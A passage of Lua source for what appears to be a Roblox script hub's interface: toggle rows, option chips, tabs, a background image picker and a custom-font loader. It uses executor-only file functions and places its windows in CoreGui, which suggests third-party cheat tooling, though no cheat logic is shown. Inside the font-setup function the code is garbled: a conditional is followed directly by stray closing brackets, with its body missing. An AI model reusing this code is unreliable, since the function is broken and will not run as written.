        if callback then callback(cur) end
        pcall(saveCherryConfig)
    end
    minusBtn.MouseButton1Click:Connect(function() setVal(cur - 1) end)
    plusBtn.MouseButton1Click:Connect(function() setVal(cur + 1) end)
    vl.FocusLost:Connect(function()
        local n = tonumber(vl.Text)
        if n then setVal(n) else vl.Text = tostring(cur) end
    end)
    return r, vl, setVal
end

local function uiChoiceRow(parent, label, options, defaultIndex, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.43,0,0,44); l.BackgroundTransparency=1
    l.Text=label; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
    local la = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-174,0,8), Size=UDim2.new(0,29,0,27), Text="<", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local vl = Instance.new("TextLabel"); vl.Position=UDim2.new(1,-141,0,8); vl.Size=UDim2.new(0,102,0,27)
    vl.BackgroundColor3=UI_BTN_BG; vl.BorderSizePixel=0; vl.Text=options[defaultIndex or 1]; vl.TextColor3=UI_TEXT_PRIMARY; vl.TextSize=10; vl.Font=Enum.Font.GothamBold; vl.Parent=r
    Instance.new("UICorner",vl).CornerRadius=UDim.new(0,7)
    local ra = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-35,0,8), Size=UDim2.new(0,29,0,27), Text=">", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local idx = defaultIndex or 1
    local function upd()
        vl.Text = options[idx]
        if callback then callback(options[idx]) end
        saveCherryConfig()
    end
    la.MouseButton1Click:Connect(function() idx=idx-1; if idx<1 then idx=#options end; upd() end)
    ra.MouseButton1Click:Connect(function() idx=idx+1; if idx>#options then idx=1 end; upd() end)
    local function setVal(v)
        for i,o in ipairs(options) do if o==v then idx=i; vl.Text=o; break end end
    end
    return r, setVal
end

local ARROW_GLOW_TRANSPARENCY = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.82, 0),
    NumberSequenceKeypoint.new(0.28, 0.06, 0),
    NumberSequenceKeypoint.new(0.52, 0.22, 0),
    NumberSequenceKeypoint.new(1, 0.82, 0),
})

local function styleArrowButton(arrow)
    -- AdaptHub-style glowing outline for ARROWS ONLY
    local border = Instance.new("UIStroke")
    border.Name = "AnimatedArrowBorder"
    border.Color = Color3.fromRGB(255, 255, 255)
    border.Thickness = 1.8
    border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    border.Transparency = 0.05
    border.Parent = arrow
    local bg = Instance.new("UIGradient")
    bg.Rotation = 135
    bg.Transparency = ARROW_GLOW_TRANSPARENCY
    bg.Parent = border

    local glow = Instance.new("UIStroke")
    glow.Name = "AnimatedArrowGlow"
    glow.Color = Color3.fromRGB(255, 255, 255)
    glow.Thickness = 3.6
    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    glow.Transparency = 0.58
    glow.Parent = arrow
    local gg = Instance.new("UIGradient")
    gg.Name = "GlowGradient"
    gg.Rotation = 180
    gg.Transparency = ARROW_GLOW_TRANSPARENCY
    gg.Parent = glow
end

local function styleOptionChip(btn, active)
    -- Black text + white outline so V1/V2/V3 stay readable
    btn:SetAttribute("ThemeChip", true)
    btn:SetAttribute("ChipActive", active and true or false)
    btn.TextColor3 = Color3.fromRGB(0, 0, 0)
    btn.BackgroundColor3 = active and UI_ACCENT or Color3.fromRGB(220, 220, 225)
    local stroke = btn:FindFirstChildOfClass("UIStroke")
    if not stroke then
        stroke = Instance.new("UIStroke")
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = btn
    end
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Thickness = active and 2 or 1.4
    stroke.Transparency = 0
    local ts = btn:FindFirstChildOfClass("UIStroke")
    -- text outline via second stroke on a label is hard; use TextStroke
    btn.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextStrokeTransparency = 0
end

local function uiExpandToggleRow(parent, label, on, options, defaultIndex, onToggle, onOption)
    -- Everything stacks UNDER the main row when the arrow is opened
    local container = Instance.new("Frame")
    container.BackgroundTransparency = 1
    container.Size = UDim2.new(1, 0, 0, 46)
    container.AutomaticSize = Enum.AutomaticSize.Y
    container.ClipsDescendants = false
    container.Parent = parent

    local col = Instance.new("UIListLayout")
    col.FillDirection = Enum.FillDirection.Vertical
    col.SortOrder = Enum.SortOrder.LayoutOrder
    col.Padding = UDim.new(0, 6)
    col.Parent = container

    -- MAIN ROW (toggle + arrow)
    local r = Instance.new("Frame")
    r.LayoutOrder = 1
    r.ClipsDescendants = true
    r.Size = UDim2.new(1, 0, 0, 46)
    r.BackgroundColor3 = UI_ROW_BG
    r.BackgroundTransparency = 0.1
    r.BorderSizePixel = 0
    r.Parent = container
    uiCardStyle(r)

    local bar = uiAccentBar(r, on)
    local l = Instance.new("TextLabel")
    l.Position = UDim2.new(0, 14, 0, 0)
    l.Size = UDim2.new(1, -110, 1, 0)
    l.BackgroundTransparency = 1
    l.Text = label
    l.TextColor3 = UI_TEXT_PRIMARY
    l.TextSize = 14
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = r

    local expanded = false
    local arrow = Instance.new("TextButton")
    arrow.Name = "ArrowButton"
    arrow.Position = UDim2.new(1, -100, 0.5, -13)
    arrow.Size = UDim2.new(0, 36, 0, 26)
    arrow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    arrow.BackgroundTransparency = 0.1
    arrow.BorderSizePixel = 0
    arrow.Text = "▼"
    arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
    arrow.TextSize = 14
    arrow.Font = Enum.Font.GothamBlack
    arrow.AutoButtonColor = false
    arrow.Parent = r
    Instance.new("UICorner", arrow).CornerRadius = UDim.new(0, 7)
    styleArrowButton(arrow)

    local tb = Instance.new("TextButton")
    tb.Position = UDim2.new(1, -54, 0.5, -11)
    tb.Size = UDim2.new(0, 44, 0, 22)
    tb.BackgroundColor3 = on and UI_ACCENT or UI_TOGGLE_OFF
    tb.BorderSizePixel = 0
    tb.Text = ""
    tb.AutoButtonColor = false
    tb.Parent = r
    Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 11)
    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0, 16, 0, 16)
    knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
    knob.BackgroundColor3 = on and UI_KNOB_ON or UI_TOGGLE_KNOB
    knob.Parent = tb
    Instance.new("UICorner", knob)

    -- OPTIONS ROW (under main row when expanded)
    -- Scrollable when many options (e.g. animation packs)
    local useScroll = #options > 4
    local optFrame = Instance.new("Frame")
    optFrame.LayoutOrder = 2
    optFrame.Size = UDim2.new(1, 0, 0, useScroll and 140 or 40)
    optFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    optFrame.BackgroundTransparency = 0.12
    optFrame.BorderSizePixel = 0
    optFrame.Visible = false
    optFrame.ClipsDescendants = true
    optFrame.Parent = container
    uiCardStyle(optFrame)

    local optPad = Instance.new("UIPadding")
    optPad.PaddingLeft = UDim.new(0, 8)
    optPad.PaddingRight = UDim.new(0, 8)
    optPad.PaddingTop = UDim.new(0, 6)
    optPad.PaddingBottom = UDim.new(0, 6)
    optPad.Parent = optFrame

    local optParent = optFrame
    if useScroll then
        local scroll = Instance.new("ScrollingFrame")
        scroll.Name = "OptionsScroll"
        scroll.Size = UDim2.new(1, -4, 1, -4)
        scroll.Position = UDim2.new(0, 2, 0, 2)
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 5
        scroll.ScrollBarImageColor3 = UI_ACCENT
        scroll.ScrollingDirection = Enum.ScrollingDirection.Y
        scroll.ElasticBehavior = Enum.ElasticBehavior.Always
        scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scroll.Parent = optFrame
        local sPad = Instance.new("UIPadding")
        sPad.PaddingLeft = UDim.new(0, 6)
        sPad.PaddingRight = UDim.new(0, 8)
        sPad.PaddingTop = UDim.new(0, 4)
        sPad.PaddingBottom = UDim.new(0, 8)
        sPad.Parent = scroll
        local sLay = Instance.new("UIListLayout")
        sLay.FillDirection = Enum.FillDirection.Vertical
        sLay.Padding = UDim.new(0, 5)
        sLay.SortOrder = Enum.SortOrder.LayoutOrder
        sLay.Parent = scroll
        optParent = scroll
    else
        local optLayout = Instance.new("UIListLayout")
        optLayout.FillDirection = Enum.FillDirection.Horizontal
        optLayout.Padding = UDim.new(0, 6)
        optLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        optLayout.SortOrder = Enum.SortOrder.LayoutOrder
        optLayout.Parent = optFrame
    end

    -- MODE SETTINGS (under options when a mode is selected + expanded)
    local settingsHost = Instance.new("Frame")
    settingsHost.Name = "ModeSettings"
    settingsHost.LayoutOrder = 3
    settingsHost.Size = UDim2.new(1, 0, 0, 0)
    settingsHost.AutomaticSize = Enum.AutomaticSize.Y
    settingsHost.BackgroundTransparency = 1
    settingsHost.Visible = false
    settingsHost.Parent = container

    local settingsLayout = Instance.new("UIListLayout")
    settingsLayout.Padding = UDim.new(0, 6)
    settingsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    settingsLayout.Parent = settingsHost

    local idx = defaultIndex or 1
    local optionBtns = {}
    local state = on
    local modeSettings = {}

    local function refreshOptionVisuals()
        for i, b in ipairs(optionBtns) do
            styleOptionChip(b, i == idx)
        end
    end

    local function refreshModeSettings()
        local any = false
        for lab, fr in pairs(modeSettings) do
            local show = expanded and (lab == options[idx])
            fr.Visible = show
            if show then any = true end
        end
        settingsHost.Visible = any
        -- container height follows AutomaticSize + list layout
    end

    for i, opt in ipairs(options) do
        local b = Instance.new("TextButton")
        b.LayoutOrder = i
        if useScroll then
            b.Size = UDim2.new(1, -4, 0, 30)
        else
            b.Size = UDim2.new(0, math.max(56, #tostring(opt) * 9 + 18), 0, 28)
        end
        b.BorderSizePixel = 0
        b.Text = tostring(opt)
        b.TextSize = useScroll and 12 or 12
        b.Font = Enum.Font.GothamBlack
        b.TextXAlignment = useScroll and Enum.TextXAlignment.Left or Enum.TextXAlignment.Center
        b.AutoButtonColor = false
        b.Parent = optParent
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
        if useScroll then
            local p = Instance.new("UIPadding")
            p.PaddingLeft = UDim.new(0, 10)
            p.Parent = b
        end
        styleOptionChip(b, i == idx)
        b.MouseButton1Click:Connect(function()
            idx = i
            refreshOptionVisuals()
            refreshModeSettings()
            if onOption then onOption(options[idx]) end
            saveCherryConfig()
        end)
        optionBtns[i] = b
    end

    local function setExpanded(v)
        expanded = v
        optFrame.Visible = v
        arrow.Text = v and "▲" or "▼"
        refreshModeSettings()
    end

    arrow.MouseButton1Click:Connect(function()
        setExpanded(not expanded)
    end)

    local function set(v)
        state = v
        local acc = UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255)
        local off = Color3.fromRGB(55, 48, 58)
        tb.BackgroundColor3 = v and acc or off
        TweenService:Create(tb, UI_TWEEN_FAST, {BackgroundColor3 = v and acc or off}):Play()
        TweenService:Create(knob, UI_TWEEN_FAST, {
            Position = v and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8),
            BackgroundColor3 = v and (UI_KNOB_ON or Color3.fromRGB(255,255,255)) or (UI_TOGGLE_KNOB or Color3.fromRGB(255,255,255))
        }):Play()
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = v and 0 or 1}):Play()
        bar.BackgroundColor3 = acc
    end

    tb.MouseButton1Click:Connect(function()
        set(not state)
        if onToggle then onToggle(state) end
        saveCherryConfig()
    end)

    local function setOption(v)
        for i, o in ipairs(options) do
            if o == v then
                idx = i
                refreshOptionVisuals()
                refreshModeSettings()
                break
            end
        end
    end

    local function registerModeSettings(optionLabel, frame)
        frame.Parent = settingsHost
        frame.Visible = false
        frame.Size = UDim2.new(1, 0, 0, 0)
        frame.AutomaticSize = Enum.AutomaticSize.Y
        modeSettings[optionLabel] = frame
        task.defer(refreshModeSettings)
    end

    return container, set, setOption, registerModeSettings, function() return options[idx] end
end

local function uiMakePage(parent, name, order, vis)
    local p = Instance.new("ScrollingFrame"); p.Name=name; p.Visible=vis~=false; p.LayoutOrder=order
    p.Size=UDim2.new(1,0,1,0); p.BackgroundTransparency=1; p.BorderSizePixel=0
    p.ScrollBarThickness=8
    p.ScrollBarImageColor3=UI_ACCENT
    p.ScrollBarImageTransparency=0.15
    p.ScrollingEnabled=true
    p.ScrollingDirection=Enum.ScrollingDirection.Y
    p.ElasticBehavior=Enum.ElasticBehavior.Always
    p.AutomaticCanvasSize=Enum.AutomaticSize.Y
    p.CanvasSize=UDim2.new(0,0,0,0)
    p.Parent=parent
    local l = Instance.new("UIListLayout"); l.Padding=UDim.new(0,7); l.SortOrder=Enum.SortOrder.LayoutOrder; l.Parent=p
    local pd = Instance.new("UIPadding")
    pd.PaddingTop=UDim.new(0,4)
    pd.PaddingBottom=UDim.new(0,40)
    pd.PaddingRight=UDim.new(0,6)
    pd.PaddingLeft=UDim.new(0,2)
    pd.Parent=p
    uiAutoCanvas(p)
    return p
end

local function uiMakeTab(parent, name, text, pos, active)
    local b = Instance.new("TextButton"); b.Name=name; b.ZIndex=9
    if pos then b.Position=pos end
    b.Size = UDim2.new(0, 96, 0, 38)
    b.BackgroundColor3 = active and UI_ACCENT or Color3.fromRGB(0, 0, 0)
    b.BackgroundTransparency = active and 0.05 or 0.35
    b.BorderSizePixel=0
    b.Text=text
    b.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(90, 90, 90)
    b.TextStrokeTransparency = 1
    b.TextTransparency=0
    b.TextSize=12; b.Font=Enum.Font.GothamBlack; b.AutoButtonColor=false; b.Parent=parent
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,10)
    local stroke = Instance.new("UIStroke"); stroke.Name="TabStroke"
    stroke.Color = UI_ACCENT or Color3.fromRGB(255,255,255)
    stroke.Thickness = active and 1.5 or 1
    stroke.Transparency = active and 0.15 or 0.75
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = b
    b:SetAttribute("IsActiveTab", active and true or false)
    b.MouseEnter:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {
                BackgroundColor3 = UI_ACCENT,
                BackgroundTransparency = 0.55,
                TextColor3 = Color3.fromRGB(255, 255, 255)
            }):Play()
            local st = b:FindFirstChild("TabStroke")
            if st then st.Transparency = 0.35; st.Thickness = 1.2 end
        end
    end)
    b.MouseLeave:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {
                BackgroundColor3 = Color3.fromRGB(0, 0, 0),
                BackgroundTransparency = 0.35,
                TextColor3 = Color3.fromRGB(90, 90, 90)
            }):Play()
            local st = b:FindFirstChild("TabStroke")
            if st then st.Transparency = 0.75; st.Thickness = 1 end
        end
    end)
    return b
end

-- MAIN BUILD
function M.applyCustomBackground(frame)
    if not frame then return end
    for _, n in ipairs({"CustomBgImage", "CustomBgPinkTint", "DotPattern", "CustomBgOverlay", "BgCorner"}) do
        local old = frame:FindFirstChild(n)
        if old then pcall(function() old:Destroy() end) end
    end
    local id = tonumber(M.customBgId) or 0
    if id <= 0 then
        id = 90631990302263
        M.customBgId = id
    end
    local allowed = false
    for _, v in ipairs(M.BG_IMAGE_IDS or {}) do
        if tonumber(v) == id then allowed = true break end
    end
    if not allowed then
        id = 90631990302263
        M.customBgId = id
    end
    pcall(function()
        local tint = UI_ACCENT or Color3.fromRGB(255, 255, 255)
        frame.BackgroundColor3 = Color3.new(tint.R * 0.18, tint.G * 0.18, tint.B * 0.18)
        frame.BackgroundTransparency = 0.22
        frame.ClipsDescendants = true
    end)
    local img = Instance.new("ImageLabel")
    img.Name = "CustomBgImage"
    img.BackgroundTransparency = 1
    img.Image = "rbxassetid://" .. tostring(id)
    img.ScaleType = Enum.ScaleType.Crop
    img.Size = UDim2.fromScale(1, 1)
    img.Position = UDim2.fromScale(0, 0)
    img.ZIndex = 0
    img.ImageTransparency = math.clamp(tonumber(M.customBgOpacity) or 0.28, 0, 1)
    local tint = UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255)
    img.ImageTransparency = math.clamp((tonumber(M.customBgOpacity) or 0.28) + 0.12, 0, 1)
    img.ImageColor3 = tint
    img.Parent = frame
    local shade = Instance.new("Frame")
    shade.Name = "CustomBgOverlay"
    shade.BackgroundColor3 = Color3.fromRGB(0,0,0)
    shade.BackgroundTransparency = 0.28
    shade.BorderSizePixel = 0
    shade.Size = UDim2.fromScale(1,1)
    shade.ZIndex = 0
    shade.Parent = frame
    local g = Instance.new("UIGradient")
    g.Rotation = 90
    g.Color = ColorSequence.new(Color3.fromRGB(0,0,0), Color3.fromRGB(0,0,0))
    g.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.45),
        NumberSequenceKeypoint.new(0.35, 0.2),
        NumberSequenceKeypoint.new(1, 0.05),
    })
    g.Parent = shade
    local radius = UDim.new(0, 16)
    local fc = frame:FindFirstChildOfClass("UICorner")
    if fc then radius = fc.CornerRadius end
    local c = Instance.new("UICorner")
    c.Name = "BgCorner"
    c.CornerRadius = radius
    c.Parent = img
end

function M.tintCustomBackground(frame)
    frame = frame or M.mainFrame
    if not frame then return end
    local tint = UI_ACCENT or Color3.fromRGB(255, 255, 255)
    pcall(function()
        frame.BackgroundColor3 = Color3.new(tint.R * 0.18, tint.G * 0.18, tint.B * 0.18)
        frame.BackgroundTransparency = 0.22
    end)
    local img = frame:FindFirstChild("CustomBgImage")
    if img and img:IsA("ImageLabel") then
        img.ImageColor3 = tint
    end
    local shade = frame:FindFirstChild("CustomBgOverlay")
    if shade and shade:IsA("Frame") then
        shade.BackgroundColor3 = Color3.new(tint.R * 0.08, tint.G * 0.08, tint.B * 0.08)
    end
    local st = frame:FindFirstChild("MainStroke")
    if st then st.Color = tint end
    local gl = frame:FindFirstChild("MainGlow")
    if gl then gl.Color = tint end
end


function M.openImagePicker(kind)
    -- kind = "bg" | "mob"
    local isBg = kind == "bg"
    local ids = isBg and M.BG_IMAGE_IDS or M.MOB_BTN_IMAGE_IDS
    local title = isBg and "CUSTOM BG" or "BUTTON BG"
    local currentId = isBg and (tonumber(M.customBgId) or 0) or (tonumber(M.mobBtnBgId) or 0)
    local opacity = math.clamp(tonumber(M.customBgOpacity) or 0.35, 0, 1)

    local old = player.PlayerGui:FindFirstChild("VynxImagePicker")
    if old then old:Destroy() end
    local cg = game:GetService("CoreGui"):FindFirstChild("VynxImagePicker")
    if cg then cg:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxImagePicker"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 120
    pcall(function() gui.Parent = game:GetService("CoreGui") end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

    -- dim backdrop (tap to close)
    local dim = Instance.new("TextButton")
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.new(0, 0, 0)
    dim.BackgroundTransparency = 0.45
    dim.Text = ""
    dim.AutoButtonColor = false
    dim.ZIndex = 1
    dim.Parent = gui
    dim.MouseButton1Click:Connect(function() gui:Destroy() end)

    local panel = Instance.new("Frame")
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.Position = UDim2.new(0.5, 0, 0.5, 0)
    panel.Size = UDim2.new(0, 220, 0, isBg and 280 or 230)
    panel.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    panel.BorderSizePixel = 0
    panel.ZIndex = 2
    panel.ClipsDescendants = true
    panel.Parent = gui
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
    local pst = Instance.new("UIStroke", panel)
    pst.Color = Color3.fromRGB(50, 50, 60)
    pst.Thickness = 1

    local hdr = Instance.new("TextLabel")
    hdr.Size = UDim2.new(1, -40, 0, 28)
    hdr.Position = UDim2.new(0, 12, 0, 6)
    hdr.BackgroundTransparency = 1
    hdr.Text = title
    hdr.TextColor3 = Color3.fromRGB(230, 230, 235)
    hdr.Font = Enum.Font.GothamBold
    hdr.TextSize = 12
    hdr.TextXAlignment = Enum.TextXAlignment.Left
    hdr.ZIndex = 3
    hdr.Parent = panel

    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 24, 0, 24)
    close.Position = UDim2.new(1, -30, 0, 6)
    close.BackgroundTransparency = 1
    close.Text = "×"
    close.TextColor3 = Color3.fromRGB(30, 30, 30)
    close.Font = Enum.Font.GothamBold
    close.TextSize = 18
    close.ZIndex = 3
    close.Parent = panel
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    local preview = Instance.new("ImageLabel")
    preview.Name = "Preview"
    preview.Size = UDim2.new(1, -24, 0, 100)
    preview.Position = UDim2.new(0, 12, 0, 34)
    preview.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    preview.BorderSizePixel = 0
    preview.ScaleType = Enum.ScaleType.Crop
    preview.Image = currentId > 0 and ("rbxassetid://" .. currentId) or ""
    preview.ImageTransparency = isBg and opacity or 0
    preview.ZIndex = 3
    preview.Parent = panel
    Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 10)

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -24, 0, 56)
    scroll.Position = UDim2.new(0, 12, 0, 142)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.ScrollBarImageColor3 = UI_ACCENT or Color3.fromRGB(40, 40, 40)
    scroll.ScrollingDirection = Enum.ScrollingDirection.X
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.X
    scroll.ZIndex = 3
    scroll.Parent = panel

    local lay = Instance.new("UIListLayout")
    lay.FillDirection = Enum.FillDirection.Horizontal
    lay.Padding = UDim.new(0, 8)
    lay.VerticalAlignment = Enum.VerticalAlignment.Center
    lay.Parent = scroll

    local selectedId = currentId

    local function selectId(id)
        selectedId = tonumber(id) or 0
        preview.Image = selectedId > 0 and ("rbxassetid://" .. selectedId) or ""
        if isBg then
            local ok = false
            if selectedId > 0 and M.BG_IMAGE_IDS then
                for _, v in ipairs(M.BG_IMAGE_IDS) do
                    if tonumber(v) == selectedId then ok = true break end
                end
            end
            M.customBgId = ok and selectedId or 123407376197646
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
        else
            local ok = false
            if selectedId > 0 and M.MOB_BTN_IMAGE_IDS then
                for _, v in ipairs(M.MOB_BTN_IMAGE_IDS) do
                    if tonumber(v) == selectedId then ok = true break end
                end
            end
            M.mobBtnBgId = ok and selectedId or 0
            if M.mobileButtonsEnabled then M.buildMobileButtons() end
        end
        pcall(saveCherryConfig)
    end

    -- None option
    local none = Instance.new("TextButton")
    none.Size = UDim2.new(0, 48, 0, 48)
    none.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
    none.Text = "OFF"
    none.TextColor3 = Color3.fromRGB(255, 255, 255)
    none.Font = Enum.Font.GothamBold
    none.TextSize = 10
    none.ZIndex = 4
    none.Parent = scroll
    Instance.new("UICorner", none).CornerRadius = UDim.new(0, 8)
    none.MouseButton1Click:Connect(function() selectId(0) end)

    for _, id in ipairs(ids) do
        local thumb = Instance.new("ImageButton")
        thumb.Size = UDim2.new(0, 48, 0, 48)
        thumb.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
        thumb.Image = "rbxassetid://" .. tostring(id)
        thumb.ScaleType = Enum.ScaleType.Crop
        thumb.ZIndex = 4
        thumb.Parent = scroll
        Instance.new("UICorner", thumb).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", thumb)
        st.Color = Color3.fromRGB(255, 255, 255)
        st.Transparency = (id == currentId) and 0.2 or 0.7
        st.Thickness = 1
        thumb.MouseButton1Click:Connect(function()
            selectId(id)
            for _, ch in ipairs(scroll:GetChildren()) do
                if ch:IsA("ImageButton") then
                    local s = ch:FindFirstChildOfClass("UIStroke")
                    if s then s.Transparency = 0.7 end
                end
            end
            st.Transparency = 0.2
        end)
    end

    if isBg then
        local opLbl = Instance.new("TextLabel")
        opLbl.Size = UDim2.new(0.5, -12, 0, 18)
        opLbl.Position = UDim2.new(0, 12, 0, 208)
        opLbl.BackgroundTransparency = 1
        opLbl.Text = "OPACITY"
        opLbl.TextColor3 = Color3.fromRGB(80, 80, 80)
        opLbl.Font = Enum.Font.GothamBold
        opLbl.TextSize = 10
        opLbl.TextXAlignment = Enum.TextXAlignment.Left
        opLbl.ZIndex = 3
        opLbl.Parent = panel

        local opVal = Instance.new("TextLabel")
        opVal.Size = UDim2.new(0.5, -12, 0, 18)
        opVal.Position = UDim2.new(0.5, 0, 0, 208)
        opVal.BackgroundTransparency = 1
        opVal.Text = tostring(math.floor((1 - opacity) * 100)) .. "%"
        opVal.TextColor3 = Color3.fromRGB(255, 255, 255)
        opVal.Font = Enum.Font.GothamBold
        opVal.TextSize = 10
        opVal.TextXAlignment = Enum.TextXAlignment.Right
        opVal.ZIndex = 3
        opVal.Parent = panel

        -- simple slider track
        local track = Instance.new("Frame")
        track.Size = UDim2.new(1, -24, 0, 8)
        track.Position = UDim2.new(0, 12, 0, 232)
        track.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        track.BorderSizePixel = 0
        track.ZIndex = 3
        track.Parent = panel
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(1 - opacity, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(220, 220, 230)
        fill.BorderSizePixel = 0
        fill.ZIndex = 4
        fill.Parent = track
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 16, 0, 16)
        knob.AnchorPoint = Vector2.new(0.5, 0.5)
        knob.Position = UDim2.new(1 - opacity, 0, 0.5, 0)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        knob.ZIndex = 5
        knob.Parent = track
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local dragging = false
        local function setFromX(x)
            local rel = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
            -- rel 1 = fully opaque image (low ImageTransparency)
            local imageTransparency = 1 - rel
            opacity = imageTransparency
            M.customBgOpacity = opacity
            fill.Size = UDim2.new(rel, 0, 1, 0)
            knob.Position = UDim2.new(rel, 0, 0.5, 0)
            preview.ImageTransparency = opacity
            opVal.Text = tostring(math.floor(rel * 100)) .. "%"
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
            saveCherryConfig()
        end
        track.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                setFromX(i.Position.X)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                setFromX(i.Position.X)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end
end


-- ============================================================
-- CUSTOM FONTS (from EXE)
-- ============================================================
function M._fontShouldTouch(obj)
    if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return false end
    if obj.TextStrokeTransparency ~= 1 then return false end
    return true
end

function M._fontApplyOne(txt)
    if not M._fontShouldTouch(txt) then return end
    if not M._fontOrig[txt] then M._fontOrig[txt] = txt.FontFace end
    if M._fontMy then
        pcall(function() txt.FontFace = M._fontMy end)
    end
end

function M._fontSetupCoding()
    if M._fontMy and M.customFontSelected == "Coding Font" then return true end
    local ok = pcall(function()
        if isfile and writefile and getcustomasset then
            if not isfile("vynx_starborn.ttf") then
            }))
            M._fontMy = Font.new(getcustomasset("vynx_starborn.json"))
        end
    end)
    return ok and M._fontMy ~= nil
end

function M.getFontForName(name)
    if not name or name == "None" then return nil end
    if name == "Coding Font" then
        if M._fontSetupCoding() then return M._fontMy end
        return nil
    elseif name == "Summer" then
        return Font.new("rbxasset://fonts/families/PermanentMarker.json")
    elseif name == "Beachy" then
        return Font.new("rbxasset://fonts/families/DenkOne.json")
    elseif name == "Scary" then
        return Font.new("rbxasset://fonts/families/Creepster.json")
    end
    return nil
end

function M.applyCustomFont(name)
    if M._fontConn then pcall(function() M._fontConn:Disconnect() end); M._fontConn = nil end
    for obj, orig in pairs(M._fontOrig) do
        pcall(function() if obj and obj.Parent then obj.FontFace = orig end end)
    end
    M._fontOrig = {}
    M.customFontSelected = name or "None"
    if name and name ~= "None" then
        local font = M.getFontForName(name)
        if font then
            M._fontMy = font
            for _, v in ipairs(game:GetDescendants()) do
                M._fontApplyOne(v)
            end
            M._fontConn = game.DescendantAdded:Connect(function(obj)
